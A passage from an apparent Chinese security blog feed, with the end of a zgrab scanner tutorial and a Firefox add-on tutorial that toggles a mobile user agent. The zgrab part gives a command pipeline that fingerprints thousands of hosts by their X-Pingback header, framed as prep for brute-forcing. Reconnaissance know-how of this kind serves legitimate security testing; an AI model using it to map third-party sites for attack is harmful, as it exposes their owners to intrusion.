class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@pw_node_1 zgrab]# curl  -I  yaseng.org</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.2.6</span><br><span class="line">Date: Sun, 27 Dec 2015 17:59:25 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Expires: Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class="line">Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0</span><br><span class="line">Pragma: no-cache</span><br><span class="line">X-Pingback: http://yaseng.org/xmlrpc.php</span><br><span class="line">Via: 10.17.21.22</span><br><span class="line">Set-Cookie: saeut=11111151239164757346; path=/; max-age=311040000</span><br><span class="line">Set-Cookie: PHPSESSID=86483bb31b614b6f5a9513854a27e321; path=/; HttpOnly</span><br></pre></td></tr></table></figure></p><p>使用 字符串   X-Pingback 来做识别指纹<br>识别命令为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat domain.log     |  ./zgrab  --port  80  --data  http-req-domain   | grep   &apos;X-Pingback&apos;  |   jq  &apos;.domain&apos; |    awk -F &apos;&quot;&apos;  &apos;&#123;print $2&#125;&apos;</span><br></pre></td></tr></table></figure></p><p>其中  domain.log   为 1w ip 到域名 ip,domain 映射<br>分分钟即可识别完,示范如图<br><a href="/uploads/2015/12/zgrab_1_2.jpg"><img src="/uploads/2015/12/zgrab_1_2-300x106.jpg" alt="" title="zgrab_1_2"></a></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://github.com/zmap/zgrab" target="_blank" rel="noopener">https://github.com/zmap/zgrab</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h3&gt;&lt;p&gt;zgrab 是基于zmap无状态扫描的应用层扫描器,可以自定义数据包,以及ip,domain之间的关联。可用于快速指纹识别爆破等场景。&lt;/p&gt;
&lt;h3 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; title=&quot;安装&quot;&gt;&lt;/a&gt;安装&lt;/h3&gt;&lt;p&gt;首先需要安装go lang 环境&lt;br&gt;然后&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;go get github.com/zmap/zgrab&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cd $GOPATH/src/github.com/zmap/zgrab&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;go build&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;使用&quot;&gt;&lt;a href=&quot;#使用&quot; class=&quot;headerlink&quot; title=&quot;使用&quot;&gt;&lt;/a&gt;使用&lt;/h3&gt;&lt;h4 id=&quot;参数&quot;&gt;&lt;a href=&quot;#参数&quot; class=&quot;headerlink&quot; title=&quot;参数&quot;&gt;&lt;/a&gt;参数&lt;/h4&gt;&lt;p&gt;zgrab -help&lt;br&gt;参数    注释    示范&lt;br&gt;port    端口    –port 80&lt;br&gt;data    发送数据包并且返回响应    –data http-req-domain&lt;br&gt;
    
    </summary>
    
      <category term="Hack" scheme="http://yaseng.org/categories/Hack/"/>
    
      <category term="神器共享" scheme="http://yaseng.org/categories/Hack/%E7%A5%9E%E5%99%A8%E5%85%B1%E4%BA%AB/"/>
    
    
      <category term="zgrab" scheme="http://yaseng.org/tags/zgrab/"/>
    
      <category term="zmap" scheme="http://yaseng.org/tags/zmap/"/>
    
      <category term="无状态扫描" scheme="http://yaseng.org/tags/%E6%97%A0%E7%8A%B6%E6%80%81%E6%89%AB%E6%8F%8F/"/>
    
  </entry>
  
  <entry>
    <title>firefox 扩展开发笔记（二）:进阶开发之移动设备模拟</title>
    <link href="http://yaseng.org/firefox-addon-mobile-device-toggle.html"/>
    <id>http://yaseng.org/firefox-addon-mobile-device-toggle.html</id>
    <published>2015-11-28T01:53:10.000Z</published>
    <updated>2016-09-01T13:27:52.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>上篇文章记录了的使用jpm 简单的开发一个demo 以及调试过程,但是实际开发中要复杂的多,本文以<br>一个实际的例子来记录如何进阶开发。</p><h3 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h3><p>为了方便于开发移动web端网页，参考chrome模拟手机浏览器功能，在火狐浏览器中，以相对简便方<br>式，实现pc端直接访问移动web端，给移动web网页开发调试工作提高便捷。<br>第一 需要响应点击按钮事件,并且得到当前的动态<br>第二 需要设置浏览器的use-agent<br><a id="more"></a></p><h3 id="资料查阅"><a href="#资料查阅" class="headerlink" title="资料查阅"></a>资料查阅</h3><h4 id="切换按钮"><a href="#切换按钮" class="headerlink" title="切换按钮"></a>切换按钮</h4><p>需要一个能切换的按钮,去官方文档找ui界面的资料<br><a href="https://developer.mozilla.org/en-US/Add-ons/SDK/High-Level_APIs/ui" title="https://developer.mozilla.org/en-US/Add-ons/SDK/High-Level_APIs/ui" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/Add-ons/SDK/High-Level_APIs/ui</a><br>找到一个符合要求的sdk  ui/button/toggle<br>地址为  :<a href="https://developer.mozilla.org/en-US/Add-ons/SDK/Low-Level_APIs/ui_button_toggle" title="https://developer.mozilla.org/en-US/Add-ons/SDK/Low-Level_APIs/ui_button_toggle" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/Add-ons/SDK/Low-Level_APIs/ui_button_toggle</a><br>示范代码<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> &#123; ToggleButton &#125; = <span class="built_in">require</span>(<span class="string">"sdk/ui/button/toggle"</span>);</span><br><span class="line"><span class="keyword">var</span> button = ToggleButton(&#123;</span><br><span class="line">  id: <span class="string">"Mobile-toggle"</span>,</span><br><span class="line">  label: <span class="string">"Toggle mobile mode"</span>,</span><br><span class="line">    icon: &#123;</span><br><span class="line">    <span class="string">"16"</span>: <span class="string">"./icon-16.png"</span>,</span><br><span class="line">    <span class="string">"32"</span>: <span class="string">"./icon-32.png"</span>,</span><br><span class="line">    <span class="string">"64"</span>: <span class="string">"./icon-64.png"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    onChange: handleClick </span><br><span class="line">  &#125;);</span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">handleClick</span>(<span class="params">state</span>) </span>&#123;</span><br><span class="line">      <span class="comment">//state.checked  是否选中</span></span><br><span class="line">      <span class="built_in">console</span>.log(state.label + <span class="string">" checked state: "</span> + state.checked);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="设置user-agent"><a href="#设置user-agent" class="headerlink" title="设置user-agent"></a>设置user-agent</h4><p>比较起ui来说查找相关资料要麻烦点。<br>有三个途径<br>第一:找类似的插件,查看源码。<br>第二:去官方文档搜索  user-agent 等关键词<br>第三:去Firefox 的高级配置页面 about:config 找到ua 的键值<br>综合以上三个方案找到设置firefox  user-agent<br>属于 API sdk/preferences/service  键值  general.useragent.override<br>如图所示<br><a href="/uploads/2015/11/firefox_2_2.jpg"><img src="/uploads/2015/11/firefox_2_2-300x105.jpg" alt="" title="firefox_2_2"></a><br>测试代码<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> prefs = <span class="built_in">require</span>(<span class="string">"sdk/preferences/service"</span>);</span><br><span class="line"><span class="keyword">var</span> key = <span class="string">"general.useragent.override"</span>;</span><br><span class="line">prefs.set(key,<span class="string">'Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.3 (KHTML, like Gecko) Version/8.0 Mobile/12A4345d Safari/600.1.4'</span>)</span><br><span class="line"><span class="built_in">console</span>.log(prefs.get(key));</span><br></pre></td></tr></table></figure></p><h3 id="编写"><a href="#编写" class="headerlink" title="编写"></a>编写</h3><h4 id="package-json"><a href="#package-json" class="headerlink" title="package.json"></a>package.json</h4><p>使用 jpm  init 向导,注意 生成 package.json 里面<br>还有一些配置没有写进去,比如图标,主页,id 等。<br>具体参考页面  <a href="https://developer.mozilla.org/en-US/Add-ons/SDK/Tools/package_json" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/Add-ons/SDK/Tools/package_json</a><br>代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;title&quot;: &quot;device mode toggle&quot;,</span><br><span class="line">  &quot;name&quot;: &quot;devicemodetoggle&quot;,</span><br><span class="line">  &quot;version&quot;: &quot;1.0.0&quot;,</span><br><span class="line">  &quot;description&quot;: &quot;a simple device mode toggle  tool&quot;,</span><br><span class="line">  &quot;main&quot;: &quot;index.js&quot;,</span><br><span class="line">  &quot;author&quot;: &quot;yaseng@uauc.net&quot;,</span><br><span class="line">  &quot;homepage&quot; : &quot;http://www.yaseng.org&quot;,</span><br><span class="line">  &quot;icon&quot;: &quot;resource://@devicemodetoggle/data/icon-48.png&quot;,</span><br><span class="line">  &quot;engines&quot;: &#123;</span><br><span class="line">    &quot;firefox&quot;: &quot;&gt;=38.0a1&quot;,</span><br><span class="line">    &quot;fennec&quot;: &quot;&gt;=38.0a1&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;license&quot;: &quot;MIT&quot;,</span><br><span class="line">  &quot;keywords&quot;: [</span><br><span class="line">    &quot;jetpack&quot;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>附加组件页面的样式图<br><a href="/uploads/2015/11/firefox-2-4.jpg"><img src="/uploads/2015/11/firefox-2-4-300x169.jpg" alt="" title="firefox-2-4"></a></p><h4 id="index-js"><a href="#index-js" class="headerlink" title="index.js"></a>index.js</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*@name      index.js</span></span><br><span class="line"><span class="comment">*@desc      a simple device mode toggle  tool</span></span><br><span class="line"><span class="comment">*@author    yaseng@uauc.net </span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="keyword">var</span> &#123; ToggleButton &#125; = <span class="built_in">require</span>(<span class="string">"sdk/ui/button/toggle"</span>);</span><br><span class="line"><span class="keyword">var</span> prefs = <span class="built_in">require</span>(<span class="string">"sdk/preferences/service"</span>);</span><br><span class="line"><span class="keyword">var</span> key = <span class="string">"general.useragent.override"</span>;</span><br><span class="line"><span class="keyword">var</span> button = ToggleButton(&#123;</span><br><span class="line">  id: <span class="string">"Mobile-toggle"</span>,</span><br><span class="line">  label: <span class="string">"Toggle mobile mode"</span>,</span><br><span class="line">    icon: &#123;</span><br><span class="line">    <span class="string">"16"</span>: <span class="string">"./icon-16.png"</span>,</span><br><span class="line">    <span class="string">"32"</span>: <span class="string">"./icon-32.png"</span>,</span><br><span class="line">    <span class="string">"64"</span>: <span class="string">"./icon-64.png"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    onChange: handleClick </span><br><span class="line">  &#125;);</span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">handleClick</span>(<span class="params">state</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">var</span>  mobile_user_agent=<span class="string">'Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.3 (KHTML, like Gecko) Version/8.0 Mobile/12A4345d Safari/600.1.4'</span>;</span><br><span class="line">      <span class="keyword">if</span> (state.checked)&#123;</span><br><span class="line">      prefs.set(key,mobile_user_agent);</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">        prefs.reset(key);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>如图所示 thinksns 的 wap端页面调试<br><a href="/uploads/2015/11/firefox-2-3.jpg"><img src="/uploads/2015/11/firefox-2-3-200x300.jpg" alt="" title="firefox-2-3"></a></p><h3 id="源码下载"><a href="#源码下载" class="headerlink" title="源码下载"></a>源码下载</h3><p>github   <a href="https://github.com/yaseng/pentest/tree/master/project/device_mode_toggle" title="https://github.com/yaseng/pentest/tree/master/project/device_mode_toggle" target="_blank" rel="noopener">https://github.com/yaseng/pentest/tree/master/project/device_mode_toggle</a></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>1:useragent  API      <a href="https://developer.mozilla.org/en-US/docs/Web/API/NavigatorID/userAgent" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/API/NavigatorID/userAgent</a><br>2:package.json         <a href="https://developer.mozilla.org/en-US/Add-ons/SDK/Tools/package_json" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/Add-ons/SDK/Tools/package_json</a><br>3:jpm icon  issue       <a href="https://github.com/mozilla-jetpack/jpm/issues/197" target="_blank" rel="noopener">https://github.com/mozilla-jetpack/jpm/issues/197</a><br>4:ui  button  toggle    <a href="https://developer.mozilla.org/en-US/Add-ons/SDK/Low-Level_APIs/ui_button_toggle" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/Add-ons/SDK/Low-Level_APIs/ui_button_toggle</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;上篇文章记录了的使用jpm 简单的开发一个demo 以及调试过程,但是实际开发中要复杂的多,本文以&lt;br&gt;一个实际的例子来记录如何进阶开发。&lt;/p&gt;
&lt;h3 id=&quot;需求&quot;&gt;&lt;a href=&quot;#需求&quot; class=&quot;headerlink&quot; title=&quot;需求&quot;&gt;&lt;/a&gt;需求&lt;/h3&gt;&lt;p&gt;为了方便于开发移动web端网页，参考chrome模拟手机浏览器功能，在火狐浏览器中，以相对简便方&lt;br&gt;式，实现pc端直接访问移动web端，给移动web网页开发调试工作提高便捷。&lt;br&gt;第一 需要响应点击按钮事件,并且得到当前的动态&lt;br&gt;第二 需要设置浏览器的use-agent&lt;br&gt;
    
    </summary>
    
      <category term="Firefox" scheme="http://yaseng.org/categories/Firefox/"/>
    
      <category term="西部大开发" scheme="http://yaseng.org/categories/Firefox/%E8%A5%BF%E9%83%A8%E5%A4%A7%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="firefox 扩展开发笔记" scheme="http://yaseng.org/tags/firefox-%E6%89%A9%E5%B1%95%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/"/>
    
      <category term="firefox扩展" scheme="http://yaseng.org/tags/firefox%E6%89%A9%E5%B1%95/"/>
    
      <category term="firefox 插件" scheme="http://yaseng.org/tags/firefox-%E6%8F%92%E4%BB%B6/"/>
    
      <category term="firefox 进阶开发" scheme="http://yaseng.org/tags/firefox-%E8%BF%9B%E9%98%B6%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
</feed>
